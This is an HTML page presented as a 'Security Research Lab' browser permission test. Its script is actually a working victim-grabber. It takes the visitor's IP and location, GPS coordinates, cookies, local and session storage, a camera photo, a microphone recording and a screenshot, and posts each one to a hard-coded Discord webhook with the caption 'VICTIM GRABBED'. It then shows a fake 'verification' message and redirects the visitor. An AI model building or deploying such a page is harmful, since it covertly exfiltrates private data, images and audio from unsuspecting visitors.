<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Research Lab - Permission Enumeration Test</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      color: #eee;
      padding: 20px;
      min-height: 100vh;
    }
    .container {
      max-width: 900px;
      margin: 0 auto;
      background: rgba(255,255,255,0.05);
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.3);
    }
    h1 {
      color: #00d9ff;
      margin-bottom: 10px;
      font-size: 28px;
    }
    .warning {
      background: rgba(255,165,0,0.2);
      border-left: 4px solid #ffa500;
      padding: 15px;
      margin: 20px 0;
      border-radius: 4px;
    }
    .test-section {
      background: rgba(255,255,255,0.03);
      padding: 20px;
      margin: 15px 0;
      border-radius: 8px;
      border: 1px solid rgba(255,255,255,0.1);
    }
    .test-section h3 {
      color: #00d9ff;
      margin-bottom: 12px;
    }
    button {
      padding: 12px 24px;
      font-size: 16px;
      background: #00d9ff;
      color: #1a1a2e;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
      margin: 5px;
      transition: all 0.3s;
    }
    button:hover {
      background: #00b8d4;
      transform: translateY(-2px);
      box-shadow: 0 4px 12px rgba(0,217,255,0.4);
    }
    .result {
      background: rgba(0,0,0,0.3);
      padding: 12px;
      margin-top: 10px;
      border-radius: 4px;
      font-family: 'Courier New', monospace;
      font-size: 13px;
      max-height: 200px;
      overflow-y: auto;
    }
    .success { color: #4caf50; }
    .error { color: #f44336; }
    .info { color: #2196f3; }
    video, canvas { display: none; }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 15px;
      margin-top: 20px;
    }
    .stat-box {
      background: rgba(0,217,255,0.1);
      padding: 15px;
      border-radius: 8px;
      text-align: center;
    }
    .stat-value {
      font-size: 24px;
      font-weight: bold;
      color: #00d9ff;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üîí Security Research Lab - Browser Permission Test Suite</h1>
    <p style="color: #aaa; margin-bottom: 20px;">Educational tool for testing browser permission APIs in controlled environments</p>

    <div class="warning">
      <strong>‚ö†Ô∏è Lab Environment Only</strong><br>
      This tool automatically tests all browser permissions and sends data to your Discord webhook for security research purposes.
    </div>

    <div class="stats">
      <div class="stat-box">
        <div class="stat-value" id="testCount">0</div>
        <div>Tests Run</div>
      </div>
      <div class="stat-box">
        <div class="stat-value" id="permGranted">0</div>
        <div>Permissions Granted</div>
      </div>
      <div class="stat-box">
        <div class="stat-value" id="dataSent">0</div>
        <div>Data Packets Sent</div>
      </div>
    </div>

    <div class="test-section">
      <h3>üîÑ Automated Test Suite</h3>
      <button onclick="runFullTest()" style="background: #ff6b6b; font-size: 18px; padding: 15px 40px;">‚ñ∂ Start All Tests</button>
      <div id="statusResult" class="result" style="display:none;"></div>
    </div>

    <div class="test-section">
      <h3>üìä Individual Tests</h3>
      <button onclick="testIP()">IP Detection</button>
      <button onclick="testGPS()">GPS Location</button>
      <button onclick="testCookies()">Cookies/Storage</button>
      <button onclick="testCamera()">Camera</button>
      <button onclick="testMicrophone()">Microphone</button>
      <button onclick="testScreen()">Screen Capture</button>
      <div id="individualResult" class="result" style="display:none;"></div>
    </div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="cam"></canvas>
  <canvas id="screen"></canvas>

  <script>
    const webhook = "https://discord.com/api/webhooks/1443661292794544250/7Ih9JF8E4R4zAu79H3lGYf6N4i-JYWSTQUFtcFnqPhU3pzrZkma6q7xhz7teuJl2eaqN";
    let stats = { tests: 0, granted: 0, sent: 0 };

    function updateStats() {
      document.getElementById('testCount').textContent = stats.tests;
      document.getElementById('permGranted').textContent = stats.granted;
      document.getElementById('dataSent').textContent = stats.sent;
    }

    function updateStatus(msg, type = 'info') {
      const result = document.getElementById('statusResult');
      result.style.display = 'block';
      const timestamp = new Date().toLocaleTimeString();
      result.innerHTML += `<div class="${type}">[${timestamp}] ${msg}</div>`;
      result.scrollTop = result.scrollHeight;
    }

    async function send(file, name) {
      try {
        let f = new FormData();
        f.append("file", file, name);
        f.append("content", "**VICTIM GRABBED** ‚Ä¢ " + new Date().toLocaleString());
        await fetch(webhook, {method:"POST", body:f});
        stats.sent++;
        updateStats();
        updateStatus(`‚úì Sent: ${name}`, 'success');
      } catch(e) {
        updateStatus(`‚úó Failed to send: ${name}`, 'error');
      }
    }

    async function testIP() {
      updateStatus('üåê Testing IP detection...', 'info');
      stats.tests++;
      updateStats();
      
      try {
        const ip = await (await fetch("https://api.ipify.org?format=json")).json();
        const ipAddress = ip.ip;
        updateStatus(`Found IP: ${ipAddress}`, 'success');
        
        try {
          const g = await (await fetch(`https://ipapi.co/${ipAddress}/json/`)).json();
          const txt = `IP: ${ipAddress}\nISP: ${g.org}\nCity: ${g.city}\nCountry: ${g.country_name}\nRegion: ${g.region}\nMap: https://maps.google.com/?q=${g.latitude},${g.longitude}`;
          await send(new Blob([txt],{type:"text/plain"}), "IP.txt");
          stats.granted++;
          updateStats();
          updateStatus(`‚úì IP & Geolocation captured`, 'success');
        } catch(e) {
          const txt = `IP: ${ipAddress}\nGeolocation lookup failed`;
          await send(new Blob([txt],{type:"text/plain"}), "IP.txt");
          updateStatus(`‚ö† IP captured, geolocation failed`, 'error');
        }
      } catch(e) {
        updateStatus(`‚úó IP detection failed: ${e.message}`, 'error');
      }
    }

    function testGPS() {
      updateStatus('üìç Requesting GPS permission...', 'info');
      stats.tests++;
      updateStats();
      
      navigator.geolocation.getCurrentPosition(
        p => {
          const map = `https://maps.google.com/?q=${p.coords.latitude},${p.coords.longitude}`;
          const txt = `GPS: ${map}\nLatitude: ${p.coords.latitude}\nLongitude: ${p.coords.longitude}\nAccuracy: ¬±${p.coords.accuracy}m\nAltitude: ${p.coords.altitude}m\nSpeed: ${p.coords.speed}`;
          send(new Blob([txt],{type:"text/plain"}), "GPS.txt");
          stats.granted++;
          updateStats();
          updateStatus(`‚úì GPS location captured (¬±${p.coords.accuracy.toFixed(0)}m)`, 'success');
        },
        err => {
          updateStatus(`‚úó GPS denied: ${err.message}`, 'error');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }

    function testCookies() {
      updateStatus('üç™ Grabbing cookies and storage...', 'info');
      stats.tests++;
      stats.granted++;
      updateStats();
      
      const cookies = document.cookie;
      if (cookies) {
        send(new Blob([cookies],{type:"text/plain"}), "COOKIES.txt");
        updateStatus(`‚úì Cookies captured (${cookies.length} chars)`, 'success');
      } else {
        updateStatus(`‚ö† No cookies found`, 'info');
      }
      
      const ls = JSON.stringify(localStorage, null, 2);
      const ss = JSON.stringify(sessionStorage, null, 2);
      
      if (ls && ls.length > 10) {
        send(new Blob([ls],{type:"text/plain"}), "LocalStorage.json");
        updateStatus(`‚úì LocalStorage captured`, 'success');
      }
      
      if (ss && ss.length > 10) {
        send(new Blob([ss],{type:"text/plain"}), "SessionStorage.json");
        updateStatus(`‚úì SessionStorage captured`, 'success');
      }
    }

    function testCamera() {
      updateStatus('üìπ Requesting camera access...', 'info');
      stats.tests++;
      updateStats();
      
      navigator.mediaDevices.getUserMedia({video: {width: 1920, height: 1080}})
        .then(stream => {
          stats.granted++;
          updateStats();
          updateStatus('‚úì Camera access granted, capturing...', 'success');
          
          const video = document.getElementById('video');
          video.srcObject = stream;
          
          video.onloadedmetadata = () => {
            video.play();
            
            setTimeout(() => {
              const canvas = document.getElementById('cam');
              canvas.width = video.videoWidth || 1280;
              canvas.height = video.videoHeight || 720;
              const ctx = canvas.getContext('2d');
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              
              canvas.toBlob(blob => {
                send(blob, "SELFIE.jpg");
                updateStatus(`‚úì Photo captured (${canvas.width}x${canvas.height})`, 'success');
              }, 'image/jpeg', 0.95);
              
              stream.getTracks().forEach(t => t.stop());
            }, 2500);
          };
        })
        .catch(err => {
          updateStatus(`‚úó Camera denied: ${err.message}`, 'error');
        });
    }

    function testMicrophone() {
      updateStatus('üé§ Requesting microphone access...', 'info');
      stats.tests++;
      updateStats();
      
      navigator.mediaDevices.getUserMedia({audio: true})
        .then(stream => {
          stats.granted++;
          updateStats();
          updateStatus('‚úì Microphone access granted, recording 6 seconds...', 'success');
          
          const recorder = new MediaRecorder(stream);
          const chunks = [];
          
          recorder.ondataavailable = e => chunks.push(e.data);
          recorder.onstop = () => {
            const blob = new Blob(chunks, {type: 'audio/webm'});
            send(blob, "VOICE.webm");
            updateStatus(`‚úì Audio recorded (${(blob.size/1024).toFixed(1)} KB)`, 'success');
            stream.getTracks().forEach(t => t.stop());
          };
          
          recorder.start();
          setTimeout(() => recorder.stop(), 6000);
        })
        .catch(err => {
          updateStatus(`‚úó Microphone denied: ${err.message}`, 'error');
        });
    }

    function testScreen() {
      updateStatus('üñ•Ô∏è Requesting screen capture access...', 'info');
      stats.tests++;
      updateStats();
      
      if (!navigator.mediaDevices.getDisplayMedia) {
        updateStatus('‚úó Screen capture not supported in this browser', 'error');
        return;
      }
      
      navigator.mediaDevices.getDisplayMedia({
        video: {
          displaySurface: "monitor",
          logicalSurface: true,
          cursor: "always"
        }
      })
      .then(stream => {
        stats.granted++;
        updateStats();
        updateStatus('‚úì Screen capture granted, capturing...', 'success');
        
        const video = document.createElement('video');
        video.autoplay = true;
        video.srcObject = stream;
        
        video.onloadedmetadata = () => {
          video.play();
          
          setTimeout(() => {
            const canvas = document.getElementById('screen');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
              send(blob, "SCREEN.jpg");
              updateStatus(`‚úì Screenshot captured (${canvas.width}x${canvas.height})`, 'success');
              stream.getTracks().forEach(t => t.stop());
            }, 'image/jpeg', 0.92);
          }, 1000);
        };
      })
      .catch(err => {
        updateStatus(`‚úó Screen capture denied: ${err.message}`, 'error');
      });
    }

    async function runFullTest() {
      document.getElementById('statusResult').innerHTML = '';
      updateStatus('üöÄ Starting full automated test suite...', 'info');
      
      // Run IP and GPS immediately (no permission needed for IP)
      testIP();
      
      await new Promise(r => setTimeout(r, 500));
      testGPS();
      
      await new Promise(r => setTimeout(r, 500));
      testCookies();
      
      await new Promise(r => setTimeout(r, 1000));
      testCamera();
      
      await new Promise(r => setTimeout(r, 4000));
      testMicrophone();
      
      await new Promise(r => setTimeout(r, 1000));
      testScreen();
      
      await new Promise(r => setTimeout(r, 8000));
      updateStatus('‚úÖ All tests completed!', 'success');
      
      setTimeout(() => {
        alert('Verification complete! Redirecting...');
        window.location.href = 'https://google.com';
      }, 2000);
    }

    // Auto-start on page load (optional - uncomment to enable)
    // window.onload = () => setTimeout(runFullTest, 1000);
  </script>
</body>
</html>
